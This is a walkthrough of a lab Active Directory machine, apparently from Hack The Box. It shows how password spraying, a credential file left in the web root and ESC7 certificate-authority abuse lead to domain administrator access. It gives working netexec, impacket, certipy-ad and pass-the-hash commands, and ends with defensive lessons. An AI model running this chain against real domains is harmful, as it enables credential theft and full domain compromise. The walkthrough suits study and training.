---
title: 'Manager Machine Walkthrough'
keywords: []
layout: single
excerpt: "Manager is a medium rated machine that shows how excessive privileges over the certificate authority in an Active Directory environment can result in complete compromise of the AD domain."
header:
  image: /assets/images/Return.png
toc: true
toc_label: "Table of Contents"
sidebar:
  nav: "sidebar"
---
---

![](/Pen-testing-blog/assets/images/1__vcbRXZbxmqHo2T1AbobDcQ.png)

## Summary

Manager is a medium rated difficulty machine running the Windows OS that shows how weak passwords, improper storage of sensitive files, and misconfigured Active Directory security roles taken together, can lead to the complete compromise of an Active Directory domain. The steps in the attack path are as follows:

* As a result of a weak password on an AD domain user account, a password spraying attack was successfully used to obtain the account password of a low level, non-privileged domain account.
* The compromised account above was used to login to a Microsoft SQL server instance using Windows authentication method.
* A special command was used to enumerate the underlying system running the MS SQL server where a backup of a website configuration file containing a another’s user password was found.
* After remotely logging into the machine with the credentials from the previous step, the [ESC 7 attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation) against a misconfigured Active Directory security role pertaining to certificate management was used to generate a fraudulent certificate for the local Administrator user and thus fully elevating privileges on the domain.

## Step 1 — Enumeration

As always, I begin by enumerating the target machine seeking to obtain as much information about OS type and version, open ports, services running on the open ports etc. as possible. I will use the **nmap** scanner.

### Enumerating with nmap

I first run a scan to discover open ports and then run the default set of nmap enumeration scripts and service detection scan only on those open ports for greater efficiency. Explanation of flags on the two scans:

* \-p — Ports on target machine to scan
* \-n — Do not resolve DNS
* \-sC — Run default set of nmap enumeration scripts
* \-sV — Detect services running on the open ports
* — min-rate 2000 — Send a minimum of 2000 packets / second to speed up the scan

nmap 10.10.11.236 -p- --min-rate 2000

![](/Pen-testing-blog/assets/images/1__vg6JfLQmzeB0NvXa9YGZxA.png)

nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49689\-49691,49774,55120 -n -sC -sV

![](/Pen-testing-blog/assets/images/1__s9TCFzAFef3OIoYVIm8dqg.png)
![](/Pen-testing-blog/assets/images/1__Ad5rFSpYbc6TNjjle2poMA.png)
![](/Pen-testing-blog/assets/images/1__s2RCcEuqCuTJlsxniCbyfw.png)

The Nmap output show that the machine is a Microsoft Windows OS domain controller with the ports below open running the following services:

* Dynamic name resolution (DNS) service running on default port of 53.
* Kerberos authentication protocol running on default port 88.
* Remote procedure call (RPC) service running on default port 135
* Lightweight directory access protocol (LDAP) running on default ports 389 and 3268 (unencrypted)
* Server messaging block (SMB) for network resource sharing running on default port of 445 and also on port 139 via the NetBios service
* Kerberos password service running on default port 464
* Encrypted version of LDAP is running on default ports 636 and 3269
* Microsoft SQL server running on default port 1433
* Windows remote management (WinRM) service over HTTP is active on default port of 5985.
* Active Directory Web Services (ADWS) running on port 9389

### Enumeration of web server — Port 80

I will begin enumerating the web server on port 80 by resolving the IP address to a host name via adding to the hosts file on my Kali Linux instance, **etc/hosts.**

![](/Pen-testing-blog/assets/images/1__cOgRhr9A0JtlHVl14tzU__Q.png)

Next, I use the GoBuster tool to fuzz for hidden directories and virtual hosts using suitable wordlists from the SecLists pen testing package which can be downloaded from [the source](https://github.com/danielmiessler/SecLists/releases). Summary of syntax for scanning for hidden directories is below:

* dir — Put GoBuster tool into directories search mode
* \-u — Specify the hostname of the target machine
* \-w — Specify the wordlist to be used

```bash
gobuster -u http://manager.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

![](/Pen-testing-blog/assets/images/1__FhtVSwMom19esdwTq1amdw.png)

As no hidden directories were found per **Figure 6**, I move on to scan for virtual hosts. Summary of syntax for scanning for virtual hosts is below:

* vhost — Put GoBuster into virtual host scanning mode
* \-u — Specify the hostname of the target machine
* \-w — Specify the wordlist to use
* — append-domain — Specify that any sub domains (virtual hosts) found are appended to main hostname of manager.htb

```bash
gobuster vhost -u http://manager.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

![](/Pen-testing-blog/assets/images/1__kQ5fP3zmhbytKb5iaK2a1g.png)

As no sub-domains were found per **Figure 7**, the enumeration of the website and port 80 is complete. Manual inspection of the webpage showed a static site that did not indicate a method that could be used to gain remote code execution (RCE) such as vulnerable web form fields.

### Enumeration of SMB with null authentication — Port 445

I use the **smbclient** tool to try to enumerate file shares without providing a password to see if null binds are allowed. As **Figure 8** shows, I was able enumerate all file shares without authentication. Although nothing interesting was found (such as non — default file shares), enabling of SMB null binds is itself a vulnerability, one that will be exploited later in the foothold step. Summary of syntax:

* \-L — List all file shares
* \-N — Use a null bind (login without a password)

![](/Pen-testing-blog/assets/images/1__tihoyibSvzmJvmfhXGc__NA.png)

### Enumeration of LDAP with null authentication— Port 389

I begin by using the tool of **ldapsearch** to enumerate the base naming context of the LDAP directory tree to learn about the architecture of the Active Directory domain. As **Figure 9** below shows, the base naming context is **dc=manager, dc=htb.** Summary of syntax:

* \-H — Specify the LDAP server name
* \-x — Use simple authentication method (Anonymous bind done by setting username and password parameters passed to length of 0)
* \-s — Specify search scope to be the base naming context of the LDAP directory tree (topmost distinguished name object)

```bash
ldapsearch -H ldap://dc01.manager.htb -x -s base namingcontexts
```

![](/Pen-testing-blog/assets/images/1__XdaDmsYpDStGRmaTadd6Mw.png)

Having obtained the base naming context, I began enumerating objects in the Active Directory domain starting with the base naming context. However, per **Figure 10**, I can't proceed without credentials.

ldapsearch -H ldap://dc01.manager.htb -x -b "dc=manager,dc=htb"

![](/Pen-testing-blog/assets/images/1__hV6xLtF0yzExdf__4yI1WZA.png)

## Step 2 — Obtaining foothold as user Operator

As the enumeration step is complete, I next proceed to search for a way to gain a foothold on the target machine in the Active Directory domain.

### Obtaining list of AD domain users via RID cycling attack

I mentioned in the previous step that SMB null binds (sessions) being enabled is a vulnerability that can be exploited. With a null session over SMB protocol, malicious actors can brute force AD domain users by obtaining security identifiers (SID) via a [relative identifier (RID) cycling attack](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/rid-cycling) (RID cycling attack) by successively incrementing the RID for each AD user account. I will perform this attack via the tool **netexec** (formerly CrackMapExec). As **Figure 10** below shows, the attack was successful with a list of user IDs on the domain obtained. Summary of syntax:

* smb — Set the netexec tool to use the smb protocol and specify IP address of the network file share
* \-u — Specify the user ID to authenticate as (Choose guest for null authentication as is here)
* \-p — Specify the password to authenticate with (Supply a blank string for null authentication as is here)
* — rid-brute — Have netexec bruteforce domain user IDs by successively incrementing the RID until a valid domain user ID is found
* | grep SidTypeUser — Filter the results for only domain user accounts and exclude AD security groups and user aliases

```bash
nxc smb 10.10.11.236 -u guest -p '' --rid-brute | grep SidTypeUser
```

![](/Pen-testing-blog/assets/images/1__5oJejRd3cfaOUc8o0ddZJg.png)

### Performing password spraying attack

As now I have a list of valid user IDs on the AD domain, I proceed to use a [password spraying attack](https://owasp.org/www-community/attacks/Password_Spraying_Attack) to obtain a password for one or more of the accounts discovered. Given it’s a common practice for users to set their password to be the same as their user ID , I test if any account has the password set to be the same as the user ID using the netexec tool. As **Figure 11** below shows, the password spraying attack is successful against the account **Operator** with the account password being the same as the account ID. Summary of syntax:

* smb — Set the netexec tool to use the smb protocol and specify IP address of the network file share
* \-u — Specify the user ID to authenticate as. I provide the file containing the cleaned version of the AD domain user IDs I obtained in the previous step
* \-p — Specify the password to authenticate with. I provide the same file for the -u parameter
* — no-brute — Command to tell netexec tool to try to log in using each pair of {user ID: password} rather than brute-forcing the password for an AD domain user account
* — Continue-on-success — Command to tell netexec to continue upon successfully obtaining the password for an account. I like the option to test to see how many vulnerable accounts there are.

nxc smb 10.10.11.236 -u user\_list\_new -p user\_list\_new --no-brute --continue-on-success

![](/Pen-testing-blog/assets/images/1__DfnlFDF0TD8VE57qfghQhw.png)

### Further enumeration as user Operator — SMB on port 445

Before beginning lateral movement to other assets or domain user accounts, I like to enumerate SMB and LDAP as Operator as previously enumeration of these services failed with a null authentication. As **Figure 13** below shows, while I can enumerate SMB shares as Operator user, nothing interesting, such as non — default file shares is found.

nxc smb manager.htb -u operator -p operator --shares

![](/Pen-testing-blog/assets/images/1__bt2oj8BzN4NcCmvJ9WGs2A.png)

### Further enumeration as user Operator — LDAP on port 389

Previously, I was unable to enumerate the details of user domain accounts and security groups due to insufficient access privileges. However, the Operator account does have sufficient access privileges to enumerate LDAP further. As **Figure 14** and **15** shows, using **ldapdump** tool**,** I was able to extract a file called **domain\_users\_by\_group.html** which contains details of the various AD domain user accounts on the domain. The user account of **Raven** is interesting as it's in an AD security group that allows for remote login if I can obtain credentials for the account.

```bash
ldapdump 10.10.11.236 -u manager.htb\\\\operator -p operator
```

![](/Pen-testing-blog/assets/images/1__rj__58tecDfT9aoDTGTa1jg.png)
![](/Pen-testing-blog/assets/images/1__AFYxOuahbl__fCrtRApeShg.png)

## Step 3 — Lateral Movement — Operator -> Raven

I discover that the domain user of Operator can log in to the Microsoft SQL Server instance per **Figure 16.**

![](/Pen-testing-blog/assets/images/1__lqgSFnVyYRalke9z4r__9ug.png)

Next , I login to the the Microsoft SQL Server instance as the domain user Operator using Windows authentication in lieu of credentials stored locally in the database (SQL authentication) using the Python script **MSSQL.py** within the [**Impacket** suite of scripts](https://www.kali.org/tools/impacket-scripts/). As shown in Figure 17, login as Operator was successful. Summary of syntax:

* windows-auth: Specify the Windows login credentials (username:password) to login to Microsoft SQL server as

```bash
impacket-mssqlclient -windows-auth manager.htb/operator:operator@manager.htb
```

![](/Pen-testing-blog/assets/images/1__QdnweFowxkJ3zHZCl25D8g.png)

### Testing access privileges of Operator domain user on SQL server

I test whether my current set of credentials can access or enable the Microsoft SQL Server feature of **xp\_cmdshell** that enables me to issue OS level commands. Unfortunately, as **Figure 18** shows, I do not have sufficient access privileges as the Operator AD domain user.

![](/Pen-testing-blog/assets/images/1____oWL9LmXXtL0m47ZO__Rq3g.png)

### Obtaining credentials for Raven domain user at web root directory

As port 80 was discovered to be open via the initial nmap scan, I decided to use the **xp\_dirtree** feature within Microsoft SQL Server to browse to the web server root directory to see if I can find any sensitive files. As **Figure 19** shows, the web root at **C:\\inetpub\\wwwroot** contains a backup of the website.

```bash
xp\_dirtree C:\\inetpub\\wwwroot
```

![](/Pen-testing-blog/assets/images/1__L7F0D96Y28g__yy7v0kj__yA.png)

After downloading the zip file (**Figure 20)** and decompressing it, I obtain a website configuration file in XML format containing the password of the AD domain user **Raven** (**Figure 21**).

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
```

![](/Pen-testing-blog/assets/images/1__aDENxBziDAVfJxhq4hm8VQ.png)
![](/Pen-testing-blog/assets/images/1__UNZo9BatR1V3u1fv__wWWYg.png)

### Remotely logging into AD domain account Raven

As the AD domain account of Raven is in the Remote Management Users AD security group, I can now use the credentials I obtained to remotely login as the user **Manager\\Raven** using the **Evil-winrm** tool in Kali Linux. As **Figure 22** shows, I successfully login as the Manager\\Raven. Summary of syntax:

* \-i — Specify the IP address or resolved hostname of the remote machine
* \-u — Specify the user ID to connect to the remote machine as
* \-p — Specify the password (in single quotes) of the user to connect as

```bash
evil-winrm -i 10.10.11.236 -u Raven -p 'R4v3nBe5tD3veloP3r!123'
```

![](/Pen-testing-blog/assets/images/1__AZ0OQd94CcKdD9SZIcSf1g.png)

## Step 4 - Privilege Escalation — Raven -> Administrator

### Enumerating access privileges of Raven user

One of the first pieces of information I like to gather is what access privileges the user I am logged in as currently has which I can obtain via the command **whoami /all.**

```bash
whoami /all
```

![](/Pen-testing-blog/assets/images/1__MaRnOl8ZD4SZHyGQLjCeBQ.png)
![](/Pen-testing-blog/assets/images/1__zAakYKK4aKEfsqEMq93DEg.png)

From **Figures 23 and 24,** I obtain the following useful information for privilege escalation vectors:

* There is a certificate authority (CA) installed on the domain controller due to the presence of the AD security group [**Certificate Service DCOM Access**](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#certificate-service-dcom-access) which allows users who are members of this group to enroll (request) certificates.
* I can add workstations to domain due to having the privilege **SeMachineAccountPrivilege.** Depending on the details of the vulnerable certificate templates I discover, I can use this method to impersonate the local Administrator account via the ESC1 attack path
* Using fraudulent certificates to impersonate the local Administrator account due to vulnerable certificate templates in use is most likely the method of privilege escalation due to the domain user Raven being a member of the above security group.

### Obtaining details of installed CA

I proceed to obtain details of the installed CA with the **certutil** tool. The details of the installed CA are shown in **figure 23** below.

![](/Pen-testing-blog/assets/images/1__YPQB2B1pZIh8rOJKa4VmHQ.png)

### Identifying vulnerable certificate templates in use

I next check if there are any vulnerable certificate templates in use via the tool [**AD-Certipy**](https://www.kali.org/tools/certipy-ad/) in find mode. Summary of syntax:

* find — Set certipy-AD tool to certificate enumeration mode
* \-dc-ip — Specify the IP address of the domain controller to connect to
* \-u — Specify the AD domain user to connect to domain controller as
* \-p — Specify the password of the AD domain user to connect to domain controller as
* \-vulnerable — Only display vulnerable templates and any vulnerabilities in certificate permissions for the current user
* \-stdout — Specify the results are to be printed to the shell command window in lieu of being written to a file as is the default behavior

```bash
certify-ad find -dc-ip 10.10.11.236 -u Raven -p 'R4v3NBe5tD3veloP3r!123' -vulnerable -stdout
```

![](/Pen-testing-blog/assets/images/1__fM__CY7NWIaOTVZCE__nz3gw.png)
![](/Pen-testing-blog/assets/images/1__QYZt3UvBaCa4L__U1mW0oMA.png)

Analyzing the certificate enumeration results above, the domain user Raven is able to exploit the [ESC7 attack path](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation) to become the local Administrator due to the following insecure configurations:

* Access privilege of **ManageCA** — A domain user with this privilege can change settings on the CA such as turning on the subject alternative name (SAN) setting which would allow Raven to request a certificate for **any domain user,** or configuring if approvals from CA are needed when users request new certificates etc.
* Access privilege of **ManageCertificates** — A domain user with this privilege can approve pending certificate requests which when combined with access privilege of **ManageCA** allows bypassing of CA approval of certificate requests

### Granting domain user Raven with ManageCertificates privilege

The first step in exploiting the ESC7 attack is to grant the domain user Raven with the ManageCertificates privilege. Summary of syntax to do this is below. Per **Figure 26** and **Figure 27,** the AD domain user **Raven** was granted the access role of **ManageCertificates**.

* ca — Set the certipy-ad tool to certificate authority management mode
* \-dc-ip — Specify the IP address of the domain controller
* \-ca — Specify the name of the certificate authority to manage (from Certipy-AD find command output)
* \-add-officer — Command to tell Certipy-AD to grant the ManageCertificate role to the AD domain user Raven

```bash
certipy-ad ca -dc-ip 10.10.11.236 -ca 'manager-DC01-CA' -add-officer Raven -u Raven -p 'R4v3nBe5tD3veloP3r!123'
```

![](/Pen-testing-blog/assets/images/1__H7t8SltQiWY8z8bBp5t9Hw.png)
![](/Pen-testing-blog/assets/images/1__KhAeUVXXl__OAwxld9zQ9DQ.png)

### Requesting certificate for the local Administrator AD domain user

The next step after granting the AD domain user Raven the access role of **ManageCertificates** is to request a certificate as the local Administrator user based on the SubCA template (subordinate CA) template natively present with ADCS. Summary of syntax to do this is below. Per **Figure 28,** the request for certificate fails due to insufficient access privileges on the SubCA template against which I am requesting a new certificate be issued.

* \-req — Set Certipy-AD into CA management mode
* \-dc-ip — Specify the IP address of the CA
* \-ca — Specify the name of the CA to manage (from Certipy-AD find command output)
* \-template — Specify the certificate template to use
* \-upn — Specify the [user principle name](https://www.techtarget.com/whatis/definition/User-Principal-Name-UPN) of the user trying to request certificate as
* \-u — Specify AD domain user to connect to the domain controller as
* \-p — Specify the password of the AD domain user to connect to domain controller as

```bash
certipy-ad req -dc-ip 10.10.11.236 -ca 'manager-DC01-CA' -template SubCA -upn 'Administrator@Manager.htb' -u Raven -p 'R4v3nBe5TD3veloP3r!123'
```

![](/Pen-testing-blog/assets/images/1__rDyFNwjhXxCn2Ddoy9jfWA.png)

### Manually reissuing the certificate after request rejection by CA

The next step after the CA rejects the certificate issuance request is to manually reissue the certificate and hence bypass the CA. This is possible due to the user AD domain user Raven having both the roles **ManagerCA** and **ManageCertificates.** Syntax to manually reissue the rejected local administrator certificate is below:

* ca — Set the certipy-ad tool to certificate authority management mode
* \-u — Specify the AD domain user to connect to domain controller as
* \-p — Specify the password of the AD domain user to connect to domain controller as
* \-dc-ip — Specify the IP address of the domain controller
* \-ca — Specify the name of the certificate authority to manage (from Certipy-AD find command output)
* \-issue-certificate — Command to tell Certipy-AD tool to manually issue the certificate with failed certificate request ID of **X.** In this case, **X=19** referencing screenshot

```bash
certipy-ad ca -ca 'Manager-DC01-CA' -u Raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -issue-request 19
```

![](/Pen-testing-blog/assets/images/1__0tvktkZOCzu6sGidVaiRgQ.png)

### Retrieving manually issued certificate PFX file

The next step after manually issuing certificate corresponding to the rejected certificate request ID is to retrieve the certificate PFX file to allow it to be used to authenticate via Kerberos in lieu of using the Administrator password. Syntax to retrieve the certificate PFX file is as follows:

* \-req — Set Certipy-AD into CA management mode
* \-dc-ip — Specify the IP address of the CA
* \-ca — Specify the name of the CA to manage (from Certipy-AD find command output)
* \-retrieve — Specify the certificate to retrieve that corresponds to the certificate ID. In this case, the certificate I want to request corresponds to the certificate request ID of 19.
* \-u — Specify AD domain user to connect to the domain controller as
* \-p — Specify the password of the AD domain user to connect to domain controller as

```bash
certipy-ad req -ca 'Manager-DC01-CA' -u Raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -retrieve 19
```

![](/Pen-testing-blog/assets/images/1__yn8lqKTiouaLnI__kzvGkvg.png)

### Capturing the Kerberos ticket granting ticket (TGT) hash for the local Administrator user

The penultimate step is to obtain the Kerberos TGT hash of the local Administrator which will be used for a pass the hash (PTH) attack in the next step to impersonate the local Administrator user. **As this step requires Kerberos authentication, it is important that the local clock on my Kali Linux machine is synced to the clock on the HTB server within 15 minutes.** Kerberos will otherwise reject the authentication request to prevent replay attacks. Syntax to obtain the local Administrator TGT ticket hash is as follows:

* faketime — [Linux tool](https://github.com/wolfcw/libfaketime) that can be used spoof the system time for a single system command.
* auth — Set the certipy-ad tool to authenticate mode
* \-dc-ip — Specify the IP address of the domain controller to log in to
* \-pfx — Specify the name of the PFX file containing the local Administrator certificate previously issued

```bash
faketime '2024-09-10 09:33:30' certipy-ad auth -dc-ip 10.10.11.236 -pfx administrator.pfx
```

![](/Pen-testing-blog/assets/images/1__ZLKwluFUMqivEbzZW__qeVg.png)

### Escalating privileges to Administrator via pass the hash (PTH) attack

The final step is to use a PTH attack to login as the local Administrator. I will be using the Evil-winrm tool to remotely login using the hash of the local Administrator in lieu of plaintext domain account password. Syntax is as follows:

* \-i — Specify the name of the remote host
* \-u — Specify the name of the AD domain user to login as
* \-H — Specify the password hash of the remote user trying to log in as and obtained from the TGT ticket in the previous step

```bash
evil-winrm -i manager.htb -u user -H ae5064c2f62317332c88629e025924ef
```

![](/Pen-testing-blog/assets/images/1__CaIoFaJrCykzOyWlW8UdVg.png)

## Section 5 - Vulnerabilities summary and lessons learned

This machine demonstrated the following vulnerabilities:

### Insecure user passwords

 As the domain user Operator was using a weak password that was identical to the user ID and had no alphanumeric or special characters, I was able to successfully bruteforce the password via a password spraying attack. Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Always use long, hard to guess passwords containing a mix of lower case and upper-case letters, alphanumeric characters, and special characters. A passphrase you can easily remember but that's hard for others to guess is ideal.

### Insecure storage of sensitive files

By browsing to the web root location on the local file system, I was able to obtain a file that contained hard-coded password of another AD domain user. Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Do not store sensitive files (e.g: those containing plaintext credentials) in insecure locations on the file system

### Improper privileged access management

As a result of non — privileged user being granted access to a highly sensitive role that allowed total control of the certificate authority, I was able to force the CA to issue a fraudulent certificate for the local Administrator domain user on the DC via the ESC 7 privilege escalation pathway. Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Always follow the principle of least privilege by ensuring that only users with a need for privileged access have such access. Roles that can change security configurations such as ManageCA should generally be limited to administrators.
* Review SIEM logs for Active Directory event IDs of 4870 - certificate authority permission changes, 4886 - Receipt of a certificate request and 4887 - certificate issuance successful